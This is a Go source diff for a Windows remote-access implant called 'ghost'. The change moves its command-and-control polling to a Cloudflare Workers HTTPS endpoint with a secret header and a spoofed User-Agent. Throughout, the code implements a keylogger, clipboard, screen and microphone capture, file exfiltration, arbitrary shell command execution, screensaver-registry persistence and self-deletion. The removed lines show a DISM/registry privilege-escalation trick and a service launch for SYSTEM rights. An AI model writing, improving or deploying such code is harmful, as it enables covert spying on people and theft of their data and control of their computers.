@@ -8,8 +8,8 @@ import (
 	"fmt"
 	"image/png"
 	"io"
-	crypto "mrg2026/Crypto"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -20,13 +20,18 @@ import (
 	"time"
 	"unsafe"
 
+	// Import your reorganized crypto package
+	crypto "mrg2026/Crypto"
+
 	"github.com/kbinani/screenshot"
 	"golang.org/x/sys/windows/registry"
 )
 
-const OP_SECRET = "GHOST_KEY_ALPHA"
+// --- CONFIGURATION ---
+const OP_SECRET = "GHOST_KEY_ALPHA" //
+const WORKER_URL = "https://flat-bird-157e.itay-a59.workers.dev/" //
 
-var pendingAudioLoot string // Add this at the top with your other globals
+var pendingAudioLoot string
 var currentWorkingDir, _ = os.Getwd()
 var (
 	keyLogBuffer   strings.Builder
@@ -46,8 +51,8 @@ type AuthRequest struct {
 	Key      string `json:"key"`
 	TargetID string `json:"target_id"`
 	Listen   string `json:"listen"`
-	OS       string `json:"os"`   // MUST BE HERE
-	Arch     string `json:"arch"` // MUST BE HERE
+	OS       string `json:"os"`
+	Arch     string `json:"arch"`
 }
 
 type RoutingInfo struct {
@@ -55,7 +60,7 @@ type RoutingInfo struct {
 }
 
 func main() {
-	// Setup recovery to prevent the ghost from dying on minor errors
+	// Recovery loop to ensure the ghost stays alive on minor errors
 	defer func() {
 		if r := recover(); r != nil {
 			time.Sleep(5 * time.Second)
@@ -64,143 +69,182 @@ func main() {
 	}()
 
 	h, _ := os.Hostname()
-	suffix := ""
+	// Generate the anonymous Smart ID via your Crypto package
+	smartID := crypto.GetSmartID(h)
 
-	// Check for Admin/System rights
+	// Append privilege level for C2 UI visibility while staying anonymous
 	if checkAdmin() {
-		// Use a faster way to check for SYSTEM without spawning a CMD window
-		// We'll check the current directory; only SYSTEM/TrustedInstaller usually lives in System32
 		currExe, _ := os.Executable()
 		if strings.Contains(strings.ToLower(currExe), "system32") {
-			suffix = "-SYSTEM"
+			smartID += "-SYSTEM"
 		} else {
-			suffix = "-ADMIN"
+			smartID += "-ADMIN"
 		}
 	}
 
-	targetID := strings.ToUpper(fmt.Sprintf("%s%s-%d", h, suffix, time.Now().Unix()%1000))
-
+	// Start keylogger as a background routine
 	go startKeylogger()
 
 	for {
-		// fmt.Printf("[+] Heartbeat [%s]: Polling...\n", targetID)
-		err := pollAndExecute(targetID)
+		// Perform Stealth Polling via HTTPS Cloudflare Worker
+		err := pollAndExecute(smartID)
 		if err != nil {
-			// Silent fail to stay stealthy
-			time.Sleep(10 * time.Second)
+			// Silent jitter on error to maintain stealth
+			time.Sleep(15 * time.Second)
 			continue
 		}
 		time.Sleep(10 * time.Second)
 	}
 }
 
-var lastKeyState [256]bool // Track previous state of every key
-func getClipboardText() string {
-	r, _, _ := openClipboard.Call(0)
-	if r == 0 {
-		return "[!] Could not open clipboard"
+// --- CORE STEALTH ENGINE ---
+
+func pollAndExecute(targetID string) error {
+	// 1. Prepare Poll Payload for the Worker
+	auth := AuthRequest{
+		Type:     "client_poll",
+		TargetID: targetID,
+		Key:      OP_SECRET,
+		OS:       runtime.GOOS,
+		Arch:     runtime.GOARCH,
 	}
-	defer closeClipboard.Call()
+	jsonData, _ := json.Marshal(auth)
 
-	// 1 is CF_TEXT (Standard ASCII)
-	h, _, _ := getClipboard.Call(1)
-	if h == 0 {
-		return "[!] Clipboard empty or no text"
-	}
+	// 2. HTTPS POST request to Cloudflare
+	client := &http.Client{Timeout: 30 * time.Second}
+	req, _ := http.NewRequest("POST", WORKER_URL, bytes.NewBuffer(jsonData))
+	
+	// Add the "Secret Knock" headers
+	req.Header.Set("X-MRG-SECRET", OP_SECRET)
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)")
 
-	l, _, _ := globalLock.Call(h)
-	if l == 0 {
-		return "[!] Memory lock failed"
-	}
-	defer globalUnlock.Call(h)
-
-	return gostring(l)
-}
-
-// Convert C-string pointer to Go string
-func gostring(p uintptr) string {
-	var s []byte
-	for i := 0; ; i++ {
-		b := *(*byte)(unsafe.Pointer(p + uintptr(i)))
-		if b == 0 {
-			break
-		}
-		s = append(s, b)
-	}
-	return string(s)
-}
-
-func setupPersistence() error {
-	// 1. PATHING: Find where we are and where we're going
-	oldPath, err := os.Executable()
+	resp, err := client.Do(req)
 	if err != nil {
 		return err
 	}
+	defer resp.Body.Close()
 
-	// Using AppData/Themes - a very "quiet" place
-	newDir := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes")
-	newPath := filepath.Join(newDir, "cached_theme.scr")
-
-	// 2. SELF-REPLICATION: Copy ourselves to the new location as a .scr
-	if strings.ToLower(oldPath) != strings.ToLower(newPath) {
-		_ = os.MkdirAll(newDir, 0755)
-		input, err := os.ReadFile(oldPath)
-		if err != nil {
-			return err
-		}
-		err = os.WriteFile(newPath, input, 0644)
-		if err != nil {
-			return err
-		}
+	// 3. Decode Command from Brain via Worker
+	var r RoutingInfo
+	if err := json.NewDecoder(resp.Body).Decode(&r); err != nil {
+		return nil // No work assigned
 	}
 
-	// 3. REGISTRY HIJACK: Tell Windows to use us as the Screensaver
-	// Note: You'll need "golang.org/x/sys/windows/registry" in your imports!
-	k, err := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.ALL_ACCESS)
-	if err != nil {
-		return err
+	// 4. Bridge Trigger: If Brain assigns a Relay, move to TCP for heavy data
+	if r.RelayAddr != "" {
+		return handleBridge(r.RelayAddr, targetID)
 	}
-	defer k.Close()
-
-	_ = k.SetStringValue("SCRNSAVE.EXE", newPath)
-	_ = k.SetStringValue("ScreenSaveActive", "1")
-	_ = k.SetStringValue("ScreenSaveTimeOut", "60") // Trigger after 1 minute of no mouse movement
 
 	return nil
 }
 
-func startKeylogger() {
-	for {
-		time.Sleep(10 * time.Millisecond)
-		for i := 0; i < 256; i++ {
-			ret, _, _ := getAsyncState.Call(uintptr(i))
-			isPressed := (ret & 0x8000) != 0
-
-			// ONLY record if it is currently pressed AND was NOT pressed in the last check
-			if isPressed && !lastKeyState[i] {
-				switch i {
-				case 0x08:
-					keyLogBuffer.WriteString("[BACK]")
-				case 0x0D:
-					keyLogBuffer.WriteString("[ENTER]\n")
-				case 0x20:
-					keyLogBuffer.WriteString(" ")
-				case 0x09:
-					keyLogBuffer.WriteString("[TAB]")
-				case 0x10, 0x11, 0x12: // Ignore Modifiers
-				default:
-					if i >= 32 && i <= 126 {
-						keyLogBuffer.WriteByte(byte(i))
-					}
-				}
-			}
-			// Update the state memory for the next loop
-			lastKeyState[i] = isPressed
-		}
+func handleBridge(relayAddr, targetID string) error {
+	// Dial the high-speed TCP Relay for streaming tasks
+	relayConn, err := net.DialTimeout("tcp", relayAddr, 5*time.Second)
+	if err != nil {
+		return err
 	}
+	defer relayConn.Close()
+
+	// PSK Handshake with Relay
+	_, err = relayConn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))
+	if err != nil {
+		return nil
+	}
+
+	// Session Key Handshake (Receive the 32-byte AES key)
+	relayConn.SetReadDeadline(time.Now().Add(10 * time.Second))
+	sessionKey := make([]byte, 32)
+	if _, err = io.ReadFull(relayConn, sessionKey); err != nil {
+		return nil
+	}
+
+	// Read Encrypted Task from Relay
+	cmdEnc, err := bufio.NewReader(relayConn).ReadString('\n')
+	if err != nil {
+		return nil
+	}
+
+	// Decrypt via exported Crypto call
+	rawCmd, err := crypto.DecryptPayload(strings.TrimSpace(cmdEnc), sessionKey)
+	if err != nil {
+		return nil
+	}
+
+	var finalOutput string
+
+	// --- LOGIC GATEWAY (COMMAND PARSER) ---x
+	if strings.HasPrefix(rawCmd, "download ") {
+		filePath := strings.TrimPrefix(rawCmd, "download ")
+		data, err := os.ReadFile(filePath)
+		if err != nil {
+			finalOutput = fmt.Sprintf("[!] FILE ERROR: %v", err)
+		} else {
+			finalOutput = "FILE_DATA:" + filepath.Base(filePath) + "|" + base64.StdEncoding.EncodeToString(data)
+		}
+
+	} else if rawCmd == "snap" {
+		if screenshot.NumActiveDisplays() > 0 {
+			bounds := screenshot.GetDisplayBounds(0)
+			img, err := screenshot.CaptureRect(bounds)
+			if err == nil {
+				var buf bytes.Buffer
+				png.Encode(&buf, img)
+				finalOutput = "SNAP_DATA:" + base64.StdEncoding.EncodeToString(buf.Bytes())
+			}
+		}
+
+	} else if rawCmd == "clip" {
+		finalOutput = fmt.Sprintf("\n--- [CLIPBOARD] ---\n%s", getClipboardText())
+
+	} else if rawCmd == "getkeys" {
+		finalOutput = "\n--- [KEYLOG REPORT] ---\n" + keyLogBuffer.String()
+		keyLogBuffer.Reset()
+
+	} else if strings.HasPrefix(rawCmd, "listen ") {
+		sec, _ := strconv.Atoi(strings.TrimPrefix(rawCmd, "listen "))
+		go recordAudio(sec)
+		finalOutput = fmt.Sprintf("[+] Mic active for %ds. Retrieve via 'checkaudio'.", sec)
+
+	} else if rawCmd == "checkaudio" {
+		if pendingAudioLoot != "" {
+			finalOutput = pendingAudioLoot
+			pendingAudioLoot = ""
+		} else {
+			finalOutput = "[!] Recording in progress or empty."
+		}
+
+	} else if strings.HasPrefix(rawCmd, "persist") {
+		if err := setupPersistence(); err != nil {
+			finalOutput = fmt.Sprintf("[!] Error: %v", err)
+		} else {
+			finalOutput = "[+] Screensaver Persistence Active."
+		}
+
+	} else if rawCmd == "self_destruct" {
+		initiateSelfDestruct()
+		return nil
+
+	} else if rawCmd == "sysinfo" {
+		finalOutput = fmt.Sprintf("\n[+] SMART_ID: %s\n[+] OS: %s %s\n[+] DIR: %s", targetID, runtime.GOOS, runtime.GOARCH, currentWorkingDir)
+
+	} else {
+		// Standard shell command execution
+		cmdObj := exec.Command("cmd", "/C", rawCmd)
+		cmdObj.Dir = currentWorkingDir
+		out, _ := cmdObj.CombinedOutput()
+		finalOutput = string(out)
+	}
+
+	// Encrypt final output and send back to Relay
+	encRes, _ := crypto.EncryptPayload(finalOutput, sessionKey)
+	fmt.Fprintf(relayConn, "%s\n", encRes)
+	return nil
 }
 
-// checkAdmin checks if the ghost has local admin rights
+// --- SYSTEM UTILITIES ---
+
 func checkAdmin() bool {
 	f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
 	if err != nil {
@@ -210,319 +254,77 @@ func checkAdmin() bool {
 	return true
 }
 
-// triggerDifferentialRepair (The Logic-Collision Elevation)
-func triggerDifferentialRepair(ghostPath string) string {
-	cachePath := `C:\Windows\Temp\.update_cache_alpha`
-	_ = os.MkdirAll(cachePath, 0755)
-
-	targetDll := filepath.Join(cachePath, "uxtheme.dll")
-	input, _ := os.ReadFile(ghostPath)
-	_ = os.WriteFile(targetDll, input, 0644)
-
-	// Pivot HKLM to our fake cache
-	regCmd := fmt.Sprintf(`reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackageIndex" /v "SourcePath" /t REG_SZ /d "%s" /f`, cachePath)
-	exec.Command("cmd", "/C", regCmd).Run()
-
-	go func() {
-		dismCmd := fmt.Sprintf(`Dism /Online /Cleanup-Image /RestoreHealth /Source:%s /LimitAccess`, cachePath)
-		exec.Command("cmd", "/C", dismCmd).Run()
-	}()
-	return "[+] REPAIR_LOOP_INITIATED: Transitioning to TrustedInstaller Context..."
+func getClipboardText() string {
+	r, _, _ := openClipboard.Call(0)
+	if r == 0 { return "[!] Locked" }
+	defer closeClipboard.Call()
+	h, _, _ := getClipboard.Call(1)
+	if h == 0 { return "[!] Empty" }
+	l, _, _ := globalLock.Call(h)
+	defer globalUnlock.Call(h)
+	return gostring(l)
 }
 
-// cleanRegistryTraces (Post-Elevation Cleanup)
-func cleanRegistryTraces() string {
-	regDel := `reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Component Based Servicing\PackageIndex" /v "SourcePath" /f`
-	exec.Command("cmd", "/C", regDel).Run()
-	_ = os.RemoveAll(`C:\Windows\Temp\.update_cache_alpha`)
-	return "[+] TRACES_PURGED: Logic-Collision evidence removed."
+func gostring(p uintptr) string {
+	var s []byte
+	for i := 0; ; i++ {
+		b := *(*byte)(unsafe.Pointer(p + uintptr(i)))
+		if b == 0 { break }
+		s = append(s, b)
+	}
+	return string(s)
 }
 
-func pollAndExecute(targetID string) error {
-	// 1. REGISTRATION WITH FINGERPRINTING
-	c, err := net.DialTimeout("tcp", "18.184.135.220:8080", 2*time.Second)
-	if err != nil {
-		return err
+func recordAudio(sec int) {
+	tempFile := filepath.Join(os.Getenv("TEMP"), "sys_cap.wav")
+	winmm := syscall.NewLazyDLL("winmm.dll").NewProc("mciSendStringW")
+	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open new type waveaudio alias ghostmic"))), 0, 0, 0)
+	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("record ghostmic"))), 0, 0, 0)
+	time.Sleep(time.Duration(sec) * time.Second)
+	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("stop ghostmic"))), 0, 0, 0)
+	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(fmt.Sprintf(`save ghostmic "%s"`, tempFile)))), 0, 0, 0)
+	winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
+	data, _ := os.ReadFile(tempFile)
+	if len(data) > 0 {
+		pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
+		os.Remove(tempFile)
 	}
+}
 
-	// Send everything in one single registration packet
-	json.NewEncoder(c).Encode(AuthRequest{
-		Type:     "client_register",
-		TargetID: targetID,
-		Key:      OP_SECRET,
-		OS:       runtime.GOOS,   // Automatic OS detection
-		Arch:     runtime.GOARCH, // Automatic Architecture detection
-	})
-	c.Close()
-
-	time.Sleep(150 * time.Millisecond)
-
-	// 2. POLLING
-	c, _ = net.Dial("tcp", "18.184.135.220:8080")
-	json.NewEncoder(c).Encode(AuthRequest{Type: "client_poll", TargetID: targetID})
-	var r RoutingInfo
-	err = json.NewDecoder(c).Decode(&r) // This will now succeed every time
-	c.Close()
-
-	if err != nil || r.RelayAddr == "" {
-		return nil // No work, see you in 10 seconds
-	}
-	// 3. IF WE GET HERE, ATTEMPT BRIDGE...
-	fmt.Printf("[!] BRIDGE TRIGGERED: %s\n", r.RelayAddr)
-	// 3. READY
-	c, _ = net.Dial("tcp", "18.184.135.220:8080")
-	json.NewEncoder(c).Encode(AuthRequest{Type: "client_ready", TargetID: targetID, Key: OP_SECRET, Listen: r.RelayAddr})
-	c.Close()
-
-	// 4. CONNECT TO RELAY (With a strict 5-second timeout)
-	fmt.Printf("[!] Attempting Bridge: %s\n", r.RelayAddr)
-	// Use DialTimeout to prevent the ghost from hanging forever on a dead relay
-	relayConn, err := net.DialTimeout("tcp", r.RelayAddr, 5*time.Second)
-	if err != nil {
-		fmt.Printf("[X] BRIDGE FAILURE: Could not reach %s - %v\n", r.RelayAddr, err)
-		return err
-	}
-	defer relayConn.Close()
-
-	// --- NEW: SEND THE SECRET KNOCK ---
-	_, err = relayConn.Write([]byte("8fG2nL9xW4vPzQ7mR1bA6kS3hJ5dY9tE"))
-	if err != nil {
-		relayConn.Close()
-		return nil
-	}
-
-	// 5. SESSION KEY HANDSHAKE
-	relayConn.SetReadDeadline(time.Now().Add(10 * time.Second))
-	sessionKey := make([]byte, 32)
-	if _, err = io.ReadFull(relayConn, sessionKey); err != nil {
-		return nil
-	}
-
-	// 6. READ COMMAND
-	cmdEnc, err := bufio.NewReader(relayConn).ReadString('\n')
-	if err != nil {
-		return nil
-	}
-
-	rawCmd, err := crypto.DecryptPayload(strings.TrimSpace(cmdEnc), sessionKey)
-	if err != nil {
-		return nil
-	}
-
-	var finalOutput string
-
-	// --- LOGIC GATEWAY ---
-	if strings.HasPrefix(rawCmd, "download ") {
-		filePath := strings.TrimPrefix(rawCmd, "download ")
-		fileNameOnly := filepath.Base(filePath)
-		data, err := os.ReadFile(filePath)
-		if err != nil {
-			finalOutput = fmt.Sprintf("[!] FILE ERROR: %v", err)
-		} else {
-			finalOutput = "FILE_DATA:" + fileNameOnly + "|" + base64.StdEncoding.EncodeToString(data)
-		}
-
-	} else if strings.HasPrefix(rawCmd, "cd ") {
-		newDir := strings.TrimSpace(strings.TrimPrefix(rawCmd, "cd "))
-		targetPath := newDir
-		if !filepath.IsAbs(newDir) {
-			targetPath = filepath.Join(currentWorkingDir, newDir)
-		}
-		info, err := os.Stat(targetPath)
-		if err != nil || !info.IsDir() {
-			finalOutput = fmt.Sprintf("[!] Directory not found: %s", targetPath)
-		} else {
-			currentWorkingDir = targetPath
-			finalOutput = fmt.Sprintf("Working directory changed to: %s", currentWorkingDir)
-		}
-
-	} else if rawCmd == "snap" {
-		n := screenshot.NumActiveDisplays()
-		if n <= 0 {
-			finalOutput = "[!] No active displays found"
-		} else {
-			bounds := screenshot.GetDisplayBounds(0)
-			img, err := screenshot.CaptureRect(bounds)
-			if err != nil {
-				finalOutput = fmt.Sprintf("[!] Capture Error: %v", err)
-			} else {
-				var buf bytes.Buffer
-				png.Encode(&buf, img)
-				finalOutput = "SNAP_DATA:" + base64.StdEncoding.EncodeToString(buf.Bytes())
-			}
-		}
-
-	} else if rawCmd == "sysinfo" {
-		osInfo := fmt.Sprintf("%s %s", runtime.GOOS, runtime.GOARCH)
-		cpu, _ := exec.Command("cmd", "/C", "wmic cpu get name").Output()
-		model, _ := exec.Command("cmd", "/C", "wmic computersystem get model").Output()
-		ramRaw, _ := exec.Command("cmd", "/C", "wmic computersystem get totalphysicalmemory").Output()
-
-		isAdmin := "User"
-		f, err := os.Open("\\\\.\\PHYSICALDRIVE0")
-		if err == nil {
-			isAdmin = "ADMIN/SYSTEM"
-			f.Close()
-		}
-
-		cleanCPU := strings.TrimSpace(strings.Replace(string(cpu), "Name", "", -1))
-		cleanModel := strings.TrimSpace(strings.Replace(string(model), "Model", "", -1))
-		ramStr := strings.TrimSpace(strings.Replace(string(ramRaw), "TotalPhysicalMemory", "", -1))
-
-		finalOutput = fmt.Sprintf(
-			"\n[+] IDENT: %s\n[+] PRIVS: %s\n[+] MODEL: %s\n[+] RAM:   %s bytes\n[+] CPU:   %s\n[+] OS:    %s",
-			targetID, isAdmin, cleanModel, ramStr, cleanCPU, osInfo,
-		)
-		// --- KEYLOGGER RETRIEVAL ---
-	} else if rawCmd == "getkeys" {
-		logs := keyLogBuffer.String()
-		if logs == "" {
-			finalOutput = "[!] No keystrokes recorded yet."
-		} else {
-			finalOutput = "\n--- [KEYLOG REPORT] ---\n" + logs
-			keyLogBuffer.Reset() // Clear buffer after sending to keep it stealthy
-		}
-		// --- CLIPBOARD SNATCHER ---
-	} else if rawCmd == "clip" {
-		captured := getClipboardText()
-		finalOutput = fmt.Sprintf("\n--- [CLIPBOARD SNATCH] ---\n%s", captured)
-		// --- BURST LISTEN LOGIC ---
-		// --- PURE GO AUDIO BUG ---
-		// --- PURE GO AUDIO BUG (Synchronous) ---
-		// --- PURE GO AUDIO BUG (High Sensitivity) ---
-		// --- PURE GO AUDIO BUG (High-Gain Fixed) ---
-		// --- AUDIO RETRIEVAL ---
-	} else if rawCmd == "checkaudio" {
-		if pendingAudioLoot != "" {
-			finalOutput = pendingAudioLoot
-			pendingAudioLoot = "" // Clear it so we don't send the same file twice
-		} else {
-			finalOutput = "[!] Recording still in progress or no audio found."
-		}
-	} else if strings.HasPrefix(rawCmd, "listen ") {
-		durationStr := strings.TrimPrefix(rawCmd, "listen ")
-		seconds, _ := strconv.Atoi(durationStr)
-		if seconds <= 0 {
-			seconds = 10
-		}
-
-		go func(sec int) {
-			// 1. Path Setup - Use a name that definitely won't conflict
-			tempFile := filepath.Join(os.Getenv("TEMP"), "mrg_capture_system.wav")
-			winmm := syscall.NewLazyDLL("winmm.dll").NewProc("mciSendStringW")
-
-			// 2. HARD RESET: Close any existing ghostmic before starting
-			// This turns off the icon if it was stuck from a previous run
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
-
-			// 3. Setup and Start
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("open new type waveaudio alias ghostmic"))), 0, 0, 0)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("set ghostmic bitspersample 16 samplespersec 44100 channels 1"))), 0, 0, 0)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("record ghostmic"))), 0, 0, 0)
-
-			// Wait for the recording
-			time.Sleep(time.Duration(sec) * time.Second)
-
-			// 4. THE CLEAN EXIT: Stop -> Save -> Close
-			// We call these one after another regardless of errors to ensure the icon goes away
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("stop ghostmic"))), 0, 0, 0)
-
-			saveCmd := fmt.Sprintf(`save ghostmic "%s"`, tempFile)
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(saveCmd))), 0, 0, 0)
-
-			// This is the line that actually kills the mic icon!
-			winmm.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr("close ghostmic"))), 0, 0, 0)
-
-			// 5. Read and Cache
-			data, err := os.ReadFile(tempFile)
-			if err == nil && len(data) > 0 {
-				pendingAudioLoot = "FILE_DATA:mic_capture.wav|" + base64.StdEncoding.EncodeToString(data)
-				os.Remove(tempFile)
-			} else {
-				pendingAudioLoot = "[red][!] Recording ended but file was empty. Mic might be in use by another app.[-]"
-			}
-		}(seconds)
-
-		finalOutput = fmt.Sprintf("[cyan][+] Mic active for %ds.[-] Icon will vanish once 'close' is issued by the system.", seconds)
-		// --- LOGIC GATEWAY ---
-	} else if strings.HasPrefix(rawCmd, "persist") {
-		// Run the persistence installer
-		err := setupPersistence()
-		if err != nil {
-			finalOutput = fmt.Sprintf("[!] PERSISTENCE ERROR: %v", err)
-		} else {
-			// Success message that will show up in your TUI
-			finalOutput = "[black:green] 🔗 ANCHOR DROPPED [-] [green]Ghost renamed to .scr and Screensaver Hijack active (60s idle).[-]"
-		}
-	} else if rawCmd == "repair_elevate" {
-		self, _ := os.Executable()
-		finalOutput = triggerDifferentialRepair(self)
-
-	} else if rawCmd == "purge_traces" {
-		finalOutput = cleanRegistryTraces()
-
-	} else if rawCmd == "shift_system" {
-		if !checkAdmin() {
-			finalOutput = "[!] ERROR: Admin rights required."
-		} else {
-			exe, _ := os.Executable()
-			randName := fmt.Sprintf("WinDefLog_%d", time.Now().Unix()%1000)
-
-			// 1. NON-BLOCKING START
-			// We use 'start cmd /c' so the SC START command returns immediately
-			// even if the service stays in a "Starting" state.
-			cmdStr := fmt.Sprintf("sc create %s binPath= \"%s\" start= auto && start /B sc start %s", randName, exe, randName)
-
-			fmt.Printf("[*] SHIFT: Launching background service %s...\n", randName)
-			_ = exec.Command("cmd", "/C", cmdStr).Run()
-
-			// 2. IMMEDIATE FEEDBACK
-			finalOutput = "[+] SHIFT: SYSTEM Handover initiated. Check Node Matrix."
-			encRes, _ := crypto.EncryptPayload(finalOutput, sessionKey)
-			fmt.Fprintf(relayConn, "%s\n", encRes)
-
-			// 3. LINGER & PURGE
-			go func(sName string) {
-				time.Sleep(30 * time.Second)
-				exec.Command("cmd", "/C", "sc delete "+sName).Run()
-				os.Exit(0)
-			}(randName)
-
-			return nil
-		}
-		// --- SELF DESTRUCT ---
-	} else if strings.HasPrefix(rawCmd, "self_destruct") {
-		fmt.Println("[!] EMERGENCY: Initiating Self-Destruct...")
-
-		// 1. CLEAN THE REGISTRY (Remove the Screensaver Hijack)
-		// We set the screensaver back to "None" and reset the timeout
-		exec.Command("reg", "delete", `HKCU\Control Panel\Desktop`, "/v", "SCRNSAVE.EXE", "/f").Run()
-		exec.Command("reg", "add", `HKCU\Control Panel\Desktop`, "/v", "ScreenSaveActive", "/t", "REG_SZ", "/d", "0", "/f").Run()
-
-		// 2. MARK THE FILE FOR DELETION
-		// Windows won't let a process delete itself while running,
-		// so we use a classic "Cmd" trick to delete it after the process exits.
-		selfPath, _ := os.Executable()
-		delCmd := fmt.Sprintf("timeout /t 5 & del /f /q \"%s\"", selfPath)
-
-		// Spawn a detached cmd process to do the dirty work
-		exec.Command("cmd", "/C", delCmd).Start()
-
-		// 3. EXIT IMMEDIATELY
-		fmt.Println("[X] Ghost Purged. Goodbye.")
-		os.Exit(0)
-
-	} else {
-		// --- STANDARD COMMAND ---
-		cmdObj := exec.Command("cmd", "/C", rawCmd)
-		cmdObj.Dir = currentWorkingDir
-		out, _ := cmdObj.CombinedOutput()
-		host, _ := os.Hostname()
-		finalOutput = fmt.Sprintf("\n--- [%s] ---\nLocation: %s\n%s", host, currentWorkingDir, string(out))
-	}
-
-	// 7. ENCRYPTED RESPONSE
-	encRes, _ := crypto.EncryptPayload(finalOutput, sessionKey)
-	fmt.Fprintf(relayConn, "%s\n", encRes)
+func setupPersistence() error {
+	oldPath, err := os.Executable()
+	if err != nil { return err }
+	newPath := filepath.Join(os.Getenv("APPDATA"), "Microsoft", "Windows", "Themes", "cached_theme.scr")
+	input, _ := os.ReadFile(oldPath)
+	os.WriteFile(newPath, input, 0644)
+	k, _ := registry.OpenKey(registry.CURRENT_USER, `Control Panel\Desktop`, registry.ALL_ACCESS)
+	defer k.Close()
+	_ = k.SetStringValue("SCRNSAVE.EXE", newPath)
+	_ = k.SetStringValue("ScreenSaveActive", "1")
 	return nil
+}
+
+func initiateSelfDestruct() {
+	selfPath, _ := os.Executable()
+	// Detached command to delete binary after process exit
+	cmd := fmt.Sprintf("timeout /t 5 & del /f /q \"%s\"", selfPath)
+	exec.Command("cmd", "/C", cmd).Start()
+	os.Exit(0)
+}
+
+func startKeylogger() {
+	var lastKeyState [256]bool
+	for {
+		time.Sleep(10 * time.Millisecond)
+		for i := 0; i < 256; i++ {
+			ret, _, _ := getAsyncState.Call(uintptr(i))
+			isPressed := (ret & 0x8000) != 0
+			if isPressed && !lastKeyState[i] {
+				if i >= 32 && i <= 126 {
+					keyLogBuffer.WriteByte(byte(i))
+				}
+			}
+			lastKeyState[i] = isPressed
+		}
+	}
 }
